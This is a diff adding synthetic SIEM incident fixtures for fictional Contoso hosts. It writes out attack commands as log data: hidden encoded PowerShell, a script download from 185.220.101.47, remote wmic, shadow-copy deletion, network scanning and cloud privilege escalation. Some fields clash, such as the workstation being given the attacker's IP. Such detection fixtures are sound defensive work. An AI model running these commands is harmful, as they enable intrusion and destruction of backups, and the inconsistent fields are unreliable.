+      "timestamp=2026-05-13T14:32:35.000Z event_type=network asset=WIN10-WS-047 source_ip=10.0.2.88 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WIN10-WS-047",
+      "ip": "10.0.2.88",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T14:31:05Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0534": {
+    "logs": [
+      "timestamp=2026-05-13T15:43:48.000Z event_type=process asset=WIN10-WS-047 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T15:44:00.000Z event_type=process asset=WIN10-WS-047 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T15:44:12.000Z event_type=process asset=WIN10-WS-047 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T15:44:24.000Z event_type=process asset=WIN10-WS-047 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T15:44:36.000Z event_type=process asset=WIN10-WS-047 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T15:44:48.000Z event_type=process asset=WIN10-WS-047 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T15:45:00.000Z event_type=process asset=WIN10-WS-047 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T15:45:12.000Z event_type=process asset=WIN10-WS-047 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T15:45:24.000Z event_type=process asset=WIN10-WS-047 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T15:45:36.000Z event_type=process asset=WIN10-WS-047 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
+      "timestamp=2026-05-13T15:45:48.000Z event_type=network asset=WIN10-WS-047 source_ip=185.220.101.47 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WIN10-WS-047",
+      "ip": "185.220.101.47",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T15:44:18Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0535": {
+    "logs": [
+      "timestamp=2026-05-13T14:53:00Z event_type=role_assignment assigning_user=finance-controller@contoso.com assigned_user=svc-backup@contoso.com role=\"Global Administrator\" source_ip=185.220.101.47 tor_exit_node=true change_ticket=NONE",
+      "timestamp=2026-05-13T14:53:30.000Z event_type=cloud_action user=svc-backup@contoso.com operation=AppRegistrationCreated source_ip=185.220.101.47 result=Success",
+      "timestamp=2026-05-13T14:53:48.000Z event_type=cloud_action user=svc-backup@contoso.com operation=ConditionalAccessPolicy.Disable source_ip=185.220.101.47 result=Success",
+      "timestamp=2026-05-13T14:54:06.000Z event_type=cloud_action user=svc-backup@contoso.com operation=KeyVault.Secret.Read source_ip=185.220.101.47 result=Success",
+      "timestamp=2026-05-13T14:54:24.000Z event_type=cloud_action user=svc-backup@contoso.com operation=RoleEligibility.Add source_ip=185.220.101.47 result=Success",
+      "timestamp=2026-05-13T14:54:42.000Z event_type=cloud_action user=svc-backup@contoso.com operation=DirectoryAudit.Read source_ip=185.220.101.47 result=Success",
+      "timestamp=2026-05-13T14:55:00.000Z event_type=cloud_action user=svc-backup@contoso.com operation=MailItemsAccessed source_ip=185.220.101.47 result=Success",
+      "timestamp=2026-05-13T14:55:18.000Z event_type=cloud_action user=svc-backup@contoso.com operation=AppRegistrationCreated source_ip=185.220.101.47 result=Success",
+      "timestamp=2026-05-13T14:55:36.000Z event_type=cloud_action user=svc-backup@contoso.com operation=ConditionalAccessPolicy.Disable source_ip=185.220.101.47 result=Success",
+      "timestamp=2026-05-13T14:55:54.000Z event_type=cloud_action user=svc-backup@contoso.com operation=KeyVault.Secret.Read source_ip=185.220.101.47 result=Success"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "185.220.101.47",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T14:53:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  }
+}
